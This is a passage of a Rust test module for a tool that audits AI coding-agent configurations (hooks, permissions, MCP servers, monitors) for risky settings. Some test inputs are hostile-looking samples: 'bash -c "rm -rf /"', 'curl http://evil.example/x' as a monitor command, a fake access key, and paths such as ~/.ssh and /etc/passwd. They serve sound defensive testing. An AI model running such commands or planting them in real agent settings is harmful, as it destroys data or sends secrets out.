            .any(|f| f.severity == Severity::High && f.message.contains("arbitrary command")));
    }

    #[test]
    fn scoped_bash_allow_is_clean() {
        let mut findings = Vec::new();
        let doc: JsonValue =
            serde_json::from_str(r#"{"permissions":{"allow":["Bash(git diff:*)"]}}"#).unwrap();
        audit_settings_doc(&doc, &mut findings);
        assert!(findings.is_empty(), "findings: {findings:?}");
    }

    #[test]
    fn inline_interpreter_hook_is_high_severity() {
        // `python -c "..."` runs arbitrary code without any shell metacharacter,
        // so the shell-chaining detector alone would miss it.
        let mut findings = Vec::new();
        let doc: JsonValue = serde_json::from_str(
            r#"{"hooks":{"SessionStart":[{"matcher":"","hooks":[{"type":"command","command":"python -c import os"}]}]}}"#,
        )
        .unwrap();
        audit_hooks_doc(&doc, &mut findings);
        assert!(
            findings
                .iter()
                .any(|f| f.severity == Severity::High && f.message.contains("inline interpreter")),
            "inline interpreter must be flagged: {findings:?}"
        );
    }

    #[test]
    fn eval_builtin_hook_is_high_severity() {
        let mut findings = Vec::new();
        let doc: JsonValue = serde_json::from_str(
            r#"{"hooks":{"Stop":[{"matcher":"","hooks":[{"type":"command","command":"eval some_var"}]}]}}"#,
        )
        .unwrap();
        audit_hooks_doc(&doc, &mut findings);
        assert!(
            findings
                .iter()
                .any(|f| f.severity == Severity::High && f.message.contains("inline interpreter")),
            "eval builtin must be flagged: {findings:?}"
        );
    }

    #[test]
    fn invokes_inline_interpreter_does_not_false_positive_on_paths() {
        // A path component like `/usr/bin/evaluate` must not trip the `eval`
        // rule, and a plain managed command must not look like an interpreter.
        assert!(!invokes_inline_interpreter("keel hook pre-tool-use"));
        assert!(!invokes_inline_interpreter("/usr/bin/evaluate --flag"));
        assert!(invokes_inline_interpreter("bash -c \"rm -rf /\""));
        assert!(invokes_inline_interpreter("node -e console.log(1)"));
    }

    #[test]
    fn secret_on_hook_command_line_is_high_severity() {
        let mut findings = Vec::new();
        let doc: JsonValue = serde_json::from_str(
            r#"{"hooks":{"SessionStart":[{"matcher":"","hooks":[{"type":"command","command":"keel hook x --token AKIAIOSFODNN7EXAMPLEKEY12345678"}]}]}}"#,
        )
        .unwrap();
        audit_hooks_doc(&doc, &mut findings);
        assert!(
            findings
                .iter()
                .any(|f| f.severity == Severity::High && f.message.contains("secret literal")),
            "embedded secret must be flagged: {findings:?}"
        );
    }

    #[test]
    fn unscoped_sensitive_allow_is_medium_severity() {
        let mut findings = Vec::new();
        let doc: JsonValue =
            serde_json::from_str(r#"{"permissions":{"allow":["Write","WebFetch"]}}"#).unwrap();
        audit_settings_doc(&doc, &mut findings);
        let medium: Vec<_> = findings
            .iter()
            .filter(|f| f.severity == Severity::Medium && f.message.contains("sensitive tool"))
            .collect();
        assert_eq!(
            medium.len(),
            2,
            "Write and WebFetch must each flag: {findings:?}"
        );
    }

    #[test]
    fn scoped_sensitive_allow_is_clean() {
        // A scoped rule (has parentheses) made a deliberate restriction.
        let mut findings = Vec::new();
        let doc: JsonValue =
            serde_json::from_str(r#"{"permissions":{"allow":["Write(src/**)","Read"]}}"#).unwrap();
        audit_settings_doc(&doc, &mut findings);
        assert!(
            findings.is_empty(),
            "scoped Write and benign Read must be clean: {findings:?}"
        );
    }

    #[test]
    fn remote_mcp_url_is_medium_severity() {
        let mut findings = Vec::new();
        let doc: JsonValue = serde_json::from_str(
            r#"{"mcpServers":{"remote":{"url":"https://api.example.com/mcp"}}}"#,
        )
        .unwrap();
        audit_manifest_doc(&doc, &mut findings);
        assert!(
            findings
                .iter()
                .any(|f| f.severity == Severity::Medium && f.message.contains("remote network URL")),
            "remote MCP URL must be flagged: {findings:?}"
        );
    }

    #[test]
    fn localhost_mcp_url_is_clean() {
        let mut findings = Vec::new();
        let doc: JsonValue =
            serde_json::from_str(r#"{"mcpServers":{"local":{"url":"http://localhost:8080/mcp"}}}"#)
                .unwrap();
        audit_manifest_doc(&doc, &mut findings);
        assert!(findings.is_empty(), "localhost is not remote: {findings:?}");
    }

    #[test]
    fn is_remote_network_url_classifies_hosts() {
        assert!(is_remote_network_url("https://evil.example.com"));
        assert!(is_remote_network_url("http://10.0.0.5:9000"));
        assert!(!is_remote_network_url("http://localhost:3000"));
        assert!(!is_remote_network_url("http://127.0.0.1"));
        assert!(!is_remote_network_url("stdio://local"));
        assert!(!is_remote_network_url(""));
    }

    #[test]
    fn mcp_env_secret_literal_is_high_severity() {
        let mut findings = Vec::new();
        let doc: JsonValue = serde_json::from_str(
            r#"{"mcpServers":{"x":{"env":{"TOKEN":"AKIAIOSFODNN7EXAMPLEKEY12345678"}}}}"#,
        )
        .unwrap();
        audit_manifest_doc(&doc, &mut findings);
        assert!(findings.iter().any(|f| f.severity == Severity::High));
    }

    #[test]
    fn mcp_env_var_reference_is_clean() {
        let mut findings = Vec::new();
        let doc: JsonValue =
            serde_json::from_str(r#"{"mcpServers":{"x":{"env":{"TOKEN":"${MY_TOKEN}"}}}}"#)
                .unwrap();
        audit_manifest_doc(&doc, &mut findings);
        assert!(findings.is_empty(), "findings: {findings:?}");
    }

    #[test]
    fn monitor_with_shell_metacharacters_is_high_severity() {
        // H12: experimental.monitors[].command is the same shell surface as hooks.
        // A piped monitor command must be flagged the same way a piped hook would be.
        let mut findings = Vec::new();
        let doc: JsonValue = serde_json::from_str(
            r#"{"experimental":{"monitors":[{"name":"build-watcher","command":"cargo check 2>&1 | tail -20"}]}}"#,
        )
        .unwrap();
        audit_manifest_doc(&doc, &mut findings);
        assert!(
            findings.iter().any(|f| f.severity == Severity::High
                && f.surface.contains("monitors.build-watcher")
                && f.message.contains("shell metacharacters")),
            "piped monitor command must be flagged high: {findings:?}"
        );
    }

    #[test]
    fn monitor_with_network_fetch_is_high_severity() {
        let mut findings = Vec::new();
        let doc: JsonValue = serde_json::from_str(
            r#"{"experimental":{"monitors":[{"name":"fetcher","command":"curl http://evil.example/x"}]}}"#,
        )
        .unwrap();
        audit_manifest_doc(&doc, &mut findings);
        assert!(
            findings
                .iter()
                .any(|f| f.severity == Severity::High && f.message.contains("network")),
            "network-fetching monitor must be flagged high: {findings:?}"
        );
    }

    #[test]
    fn monitor_without_experimental_key_is_clean() {
        let mut findings = Vec::new();
        let doc: JsonValue = serde_json::from_str(
            r#"{"mcpServers":{"x":{"command":"keel","args":["mcp","serve"]}}}"#,
        )
        .unwrap();
        audit_manifest_doc(&doc, &mut findings);
        assert!(findings.is_empty(), "findings: {findings:?}");
    }

    #[test]
    fn scoped_dangerous_bash_subcommand_is_high_severity() {
        // `Bash(sudo:*)` is SCOPED (has parens), so the unscoped-Bash rule misses
        // it — but it auto-approves privilege escalation, which the dangerous-
        // subcommand rule must catch as high.
        let mut findings = Vec::new();
        let doc: JsonValue =
            serde_json::from_str(r#"{"permissions":{"allow":["Bash(sudo:*)"]}}"#).unwrap();
        audit_settings_doc(&doc, &mut findings);
        assert!(
            findings
                .iter()
                .any(|f| f.severity == Severity::High && f.message.contains("dangerous command")),
            "Bash(sudo:*) must be flagged high: {findings:?}"
        );
    }

    #[test]
    fn dangerous_bash_subcommand_classifier() {
        assert!(is_dangerous_bash_subcommand("Bash(rm:*)"));
        assert!(is_dangerous_bash_subcommand("Bash(curl:*)"));
        assert!(is_dangerous_bash_subcommand("Bash(/usr/bin/sudo:*)"));
        // A benign scoped command must NOT be flagged dangerous.
        assert!(!is_dangerous_bash_subcommand("Bash(git diff:*)"));
        assert!(!is_dangerous_bash_subcommand("Bash(cargo test:*)"));
        // Not a Bash rule at all.
        assert!(!is_dangerous_bash_subcommand("Read(src/**)"));
    }

    #[test]
    fn filesystem_wide_scope_is_high_severity() {
        let mut findings = Vec::new();
        let doc: JsonValue =
            serde_json::from_str(r#"{"permissions":{"allow":["Read(/**)"]}}"#).unwrap();
        audit_settings_doc(&doc, &mut findings);
        assert!(
            findings
                .iter()
                .any(|f| f.severity == Severity::High && f.message.contains("filesystem-wide")),
            "Read(/**) must be flagged high: {findings:?}"
        );
    }

    #[test]
    fn wildcard_filesystem_scope_classifier() {
        assert!(is_wildcard_filesystem_scope("Read(/**)"));
        assert!(is_wildcard_filesystem_scope("Write(~/**)"));
        assert!(is_wildcard_filesystem_scope("Edit(**)"));
        // A real, bounded project scope must NOT trip it.
        assert!(!is_wildcard_filesystem_scope("Read(src/**)"));
        assert!(!is_wildcard_filesystem_scope("Write(docs/api.md)"));
    }

    #[test]
    fn wildcard_webfetch_is_medium_severity() {
        let mut findings = Vec::new();
        let doc: JsonValue =
            serde_json::from_str(r#"{"permissions":{"allow":["WebFetch(domain:*)"]}}"#).unwrap();
        audit_settings_doc(&doc, &mut findings);
        assert!(
            findings
                .iter()
                .any(|f| f.severity == Severity::Medium && f.message.contains("ANY domain")),
            "WebFetch(domain:*) must be flagged medium: {findings:?}"
        );
    }

    #[test]
    fn scoped_webfetch_domain_is_clean() {
        let mut findings = Vec::new();
        let doc: JsonValue =
            serde_json::from_str(r#"{"permissions":{"allow":["WebFetch(domain:docs.rs)"]}}"#)
                .unwrap();
        audit_settings_doc(&doc, &mut findings);
        assert!(
            findings.is_empty(),
            "a real domain scope is clean: {findings:?}"
        );
    }

    #[test]
    fn enable_all_project_mcp_servers_is_medium_severity() {
        let mut findings = Vec::new();
        let doc: JsonValue =
            serde_json::from_str(r#"{"enableAllProjectMcpServers":true}"#).unwrap();
        audit_settings_doc(&doc, &mut findings);
        assert!(
            findings
                .iter()
                .any(|f| f.severity == Severity::Medium && f.message.contains("auto-trusts")),
            "enableAllProjectMcpServers must be flagged: {findings:?}"
        );
    }

    #[test]
    fn api_key_helper_is_flagged() {
        let mut findings = Vec::new();
        let doc: JsonValue =
            serde_json::from_str(r#"{"apiKeyHelper":"/opt/mint-key.sh"}"#).unwrap();
        audit_settings_doc(&doc, &mut findings);
        assert!(
            findings.iter().any(|f| f.message.contains("apiKeyHelper")),
            "apiKeyHelper must be flagged: {findings:?}"
        );
    }

    #[test]
    fn additional_directories_outside_workspace_is_medium_severity() {
        let mut findings = Vec::new();
        let doc: JsonValue = serde_json::from_str(
            r#"{"permissions":{"additionalDirectories":["~/.ssh","../secrets","docs"]}}"#,
        )
        .unwrap();
        audit_settings_doc(&doc, &mut findings);
        let flagged: Vec<_> = findings
            .iter()
            .filter(|f| f.message.contains("outside the workspace"))
            .collect();
        // ~/.ssh and ../secrets reach outside; the relative "docs" does not.
        assert_eq!(
            flagged.len(),
            2,
            "two outside paths must flag: {findings:?}"
        );
    }

    #[test]
    fn reaches_outside_workspace_classifier() {
        assert!(reaches_outside_workspace("/etc/passwd"));
        assert!(reaches_outside_workspace("~/.ssh"));
        assert!(reaches_outside_workspace("../parent"));
        assert!(reaches_outside_workspace("C:\\Windows"));
        assert!(reaches_outside_workspace("sub/../../escape"));
        // In-workspace relative paths are fine.
        assert!(!reaches_outside_workspace("docs"));
        assert!(!reaches_outside_workspace("src/utility"));
        assert!(!reaches_outside_workspace(""));
    }

    #[test]
    fn existing_malformed_json_is_not_treated_as_clean_or_missing() {
        let directory = crate::test_support::unique_temp_dir("keel-config-audit-malformed");
        let path = directory.join("settings.json");
        fs::write(&path, "{\"permissions\":").expect("write malformed config");

        let result = read_json(&path);

        let error = result.expect_err("malformed existing config must fail closed");
        assert!(error.contains("parse"), "unexpected error: {error}");
    }

    #[test]
    fn non_object_config_root_is_reported_as_unsupported() {
        let mut findings = Vec::new();
        let directory = crate::test_support::unique_temp_dir("keel-config-audit-shape");
        let path = directory.join("hooks.json");
        fs::write(&path, "[]").expect("write unsupported config");

        audit_json_file(&path, "hooks.json", audit_hooks_doc, &mut findings);

        assert!(
            findings.iter().any(|finding| {
                finding.severity == Severity::High
                    && finding.surface == "hooks.json"
                    && finding.message.contains("unsupported config shape")
            }),
            "findings: {findings:?}"
        );
    }

    #[test]
    fn malformed_known_sections_are_reported_without_hiding_other_sections() {
        let mut findings = Vec::new();
        let document: JsonValue = serde_json::from_str(
            r#"{"mcpServers":[],"experimental":{"monitors":[{"name":"remote","command":"curl http://evil.example/x"}]}}"#,
        )
        .unwrap();

        audit_manifest_doc(&document, &mut findings);

        assert!(
            findings.iter().any(|finding| {
                finding.surface == "plugin.json:mcpServers"
                    && finding.message.contains("unsupported config shape")
            }),
            "malformed mcpServers must be visible: {findings:?}"
        );
        assert!(
            findings.iter().any(|finding| {
                finding.surface.contains("experimental.monitors.remote")
                    && finding.message.contains("network")
            }),
            "valid monitor findings must not be hidden: {findings:?}"
        );
    }

    #[test]
    fn command_reports_malformed_existing_surface_and_fails_closed() {
        let directory = crate::test_support::unique_temp_dir("keel-config-audit-command");
        fs::create_dir_all(directory.join(".claude")).expect("claude directory");
        fs::create_dir_all(directory.join(".claude-plugin")).expect("plugin directory");
        fs::write(directory.join(".claude/hooks.json"), "not-json").expect("malformed hooks");
        fs::write(directory.join(".claude-plugin/plugin.json"), "{}").expect("plugin");
        let mut output = Vec::new();
        let mut error = Vec::new();

        let code = run_config_audit_command(
            &[
                "--repo-root".to_string(),
                directory.to_string_lossy().to_string(),
                "--json".to_string(),
            ],
            &mut output,
            &mut error,
        );

        assert_eq!(code, 2, "malformed existing config must fail audit");
        let rendered = String::from_utf8(output).expect("json output");
        assert!(
            rendered.contains("could not be audited"),
            "output: {rendered}"
        );
        assert!(error.is_empty(), "unexpected stderr: {:?}", error);
    }
}
